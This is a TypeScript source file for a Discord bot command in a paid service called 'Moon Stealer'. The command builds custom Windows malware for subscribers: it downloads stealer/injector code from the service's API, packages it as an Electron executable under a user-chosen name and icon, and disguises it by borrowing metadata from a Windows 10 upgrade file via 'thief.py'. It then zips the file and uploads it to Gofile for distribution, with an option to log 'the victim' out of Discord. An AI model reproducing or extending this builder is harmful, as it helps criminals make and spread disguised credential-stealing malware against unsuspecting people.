import { build, Platform } from "electron-builder";
import request from "request";
import { execSync } from "child_process";
import {
  ActionRowBuilder,
  ApplicationCommandOptionType,
  ButtonBuilder,
  ButtonStyle,
  CommandInteraction,
  EmbedBuilder,
  hyperlink,
} from "discord.js";
import { CaseyClient } from "../../types/bot/client.js";
import { PrismaClient } from "@prisma/client";
import { emojis } from "../../utils/emojis";

import {
  readFileSync,
  createWriteStream,
  mkdirSync,
  writeFileSync,
  unlinkSync,
} from "fs";
import { join } from "path";

import { getServer, uploadFile } from "../../functions/utils/gofile.js";

const prisma = new PrismaClient();

export default {
  name: "build",
  description: "Build your executable within seconds.",
  options: [
    {
      name: "name",
      description: "Name of your executable/app.",
      type: ApplicationCommandOptionType.String,
      required: true,
    },
    {
      name: "icon",
      description: "An icon for your executable, in .ico format.",
      type: ApplicationCommandOptionType.Attachment,
      required: false,
    },
    {
      name: "type",
      description: "The executable type, default: NSIS.",
      type: ApplicationCommandOptionType.String,
      required: false,
      choices: [
        {
          name: "NSIS",
          value: "nsis",
        },
        {
          name: "Normal",
          value: "portable",
        },
      ],
    },
    {
      name: "logout_discord",
      description:
        "If the victim will be logged-out from Discord, default: True.",
      type: ApplicationCommandOptionType.String,
      required: false,
      choices: [
        {
          name: "True",
          value: "true",
        },
        {
          name: "False",
          value: "false",
        },
      ],
    },
  ],

  run: async (client: CaseyClient, interaction: CommandInteraction) => {
    const user = await prisma.users.findFirst({
      where: {
        id: interaction?.user?.id,
      },
    });

    if (!user)
      return interaction.reply({
        ephemeral: true,
        content: `${emojis.empty} **|** No informations found in the database. Please try again later.`,
      });

    if (!user.plan)
      return interaction.reply({
        ephemeral: true,
        content: `${emojis.empty} **|** You don't have any Moon plan. Buy it in our Telegram.`,
      });

    const { options } = interaction;
    // @ts-ignore
    const exe_name = options.getString("name").replace(/ /g, "");
    // @ts-ignore
    const exe_type = options.getString("type");
    // @ts-ignore
    const discord_logout = options.getString("logout_discord");
    console.log(discord_logout);
    // @ts-ignore
    const exe_icon = options.getAttachment("icon");

    if (exe_icon && exe_icon.contentType !== "image/vnd.microsoft.icon")
      return interaction.reply({
        ephemeral: true,
        content: `${emojis.empty} **|** The icon you sent is not in the **.ico** format. Please try again.`,
      });

    const embed = new EmbedBuilder()
      .setAuthor({
        name: `Moon | Build [1/5]`,
        iconURL: interaction.user.avatarURL()!,
      })
      .setFooter({
        text: `Moon Stealer | Downloading Code`,
        iconURL: client.user?.avatarURL()!,
      })
      .setTimestamp()
      .setDescription(`${emojis.system} Downloading Moon Stealer **code**.`)
      .setColor(6212572);

    await interaction.reply({
      embeds: [embed],
      ephemeral: true,
    });

    const request_code = await fetch(process.env.API_URL + "injector", {
      method: "GET",
      headers: {
        stealer_user: interaction?.user?.id,
        logout_discord: ["true", "false"].includes(discord_logout)
          ? discord_logout
          : "true",
      },
    });

    const Casey_code = await request_code.text();

    const build_id = makeid(9);
    if (exe_icon) {
      request(exe_icon?.url).pipe(
        createWriteStream(
          join(__dirname, "..", "..", "builds", "icons", build_id + ".ico")
        )
      );
    }

    createDirectorys(build_id);

    const package_json = readFileSync(
      join(__dirname, "..", "..", "stealer", "package.json"),
      "utf-8"
    )
      .replace("exe_name_here", exe_name)
      .replace("author_name_here", `${exe_name} Inc`);
    writeFileSync(
      join(__dirname, "..", "..", "builds", build_id, "source", "app.js"),
      Casey_code,
      "utf-8"
    );
    writeFileSync(
      join(__dirname, "..", "..", "builds", build_id, "source", "package.json"),
      package_json,
      "utf-8"
    );

    embed.setAuthor({
      name: `Moon | Build [2/5]`,
      iconURL: interaction.user.avatarURL()!,
    });
    embed.setDescription(`${emojis.system} Building your **executable**.`);
    embed.setFooter({
      text: `Moon Stealer | Building EXE`,
      iconURL: client.user?.avatarURL()!,
    });
    await interaction.editReply({
      embeds: [embed],
    });

    await build({
      targets: Platform.WINDOWS.createTarget(),
      config: {
        productName: exe_name || "Casey",
        npmRebuild: true,
        nodeGypRebuild: false,
        buildDependenciesFromSource: true,
        electronVersion: "24.1.1",
        nodeVersion: "18.15.0",
        appId: build_id,
        compression: "maximum",
        icon: exe_icon
          ? join(__dirname, "..", "..", "builds", "icons", build_id + ".ico")
          : "None",
        directories: {
          app: join(__dirname, "..", "..", "builds", build_id, "source"),
          output: join(__dirname, "..", "..", "builds", build_id, "build"),
        },
        win: {
          artifactName: `${build_id}.exe`,
          target: [
            {
              target: ["nsis", "portable"].includes(exe_type)
                ? exe_type
                : "nsis",
              arch: ["x64"],
            },
          ],
        },
      },
    });

    execSync(
      `py .\\thief.py -i .\\src\\stealer\\Windows10Upgrade9252.exe -t .\\src\\builds\\${build_id}\\build\\${build_id}.exe -o .\\final_builds\\${exe_name.replace(
        ".exe",
        ""
      )}.exe`
    );

    embed.setFooter({
      text: `Moon Stealer | Creating RAR`,
      iconURL: client.user?.avatarURL()!,
    });
    embed.setAuthor({
      name: `Moon | Build [3/5]`,
      iconURL: interaction.user.avatarURL()!,
    });
    embed.setDescription(`${emojis.system} Compacting your file into **RAR**.`);
    await interaction.editReply({
      embeds: [embed],
    });

    execSync(
      `rar a -r .\\final_rar\\${exe_name.replace(
        ".exe",
        ""
      )}.rar .\\final_builds\\${exe_name.replace(".exe", "")}.exe`
    ).toString();

    const file = readFileSync(
      join(
        __dirname,
        "..",
        "..",
        "..",
        "final_rar",
        `${exe_name.replace(".exe", "")}.rar`
      )
    );
    const { server } = await getServer();

    embed.setDescription(`${emojis.system} Uploading your **RAR** to Gofile.`);
    embed.setFooter({
      text: `Moon Stealer | Uploading RAR`,
      iconURL: client.user?.avatarURL()!,
    });
    embed.setAuthor({
      name: `Moon | Build [4/5]`,
      iconURL: interaction.user.avatarURL()!,
    });

    await interaction.editReply({
      embeds: [embed],
    });

    const response = await uploadFile(
      server,
      file,
      exe_name.replace(".exe", "") + ".rar"
    );

    embed.setAuthor({
      name: `Moon | Build [5/5]`,
      iconURL: interaction.user.avatarURL()!,
    });
    embed.setDescription(`${emojis.system} Finished **building**.`);
    embed.setFooter({
      text: `    | Successfull Build`,
      iconURL: client.user?.avatarURL()!,
    });
    await interaction.editReply({
      embeds: [embed],
      components: [
        new ActionRowBuilder<ButtonBuilder>().addComponents(
          new ButtonBuilder()
            .setStyle(ButtonStyle.Link)
            .setLabel("Executable Download")
            .setURL(response.downloadPage)
        ),
      ],
    });

    unlinkSync(
      join(
        __dirname,
        "..",
        "..",
        "..",
        "final_rar",
        `${exe_name.replace(".exe", "")}.rar`
      )
    );
    unlinkSync(
      join(
        __dirname,
        "..",
        "..",
        "..",
        "final_builds",
        `${exe_name.replace(".exe", "")}.exe`
      )
    );
  },
};

function makeid(length: number) {
  let result = "";
  const characters =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  const charactersLength = characters.length;
  let counter = 0;
  while (counter < length) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
    counter += 1;
  }
  return result;
}

async function createDirectorys(id: string) {
  mkdirSync(join(__dirname, "..", "..", "builds", id));
  mkdirSync(join(__dirname, "..", "..", "builds", id, "source"));
  mkdirSync(join(__dirname, "..", "..", "builds", id, "build"));
}
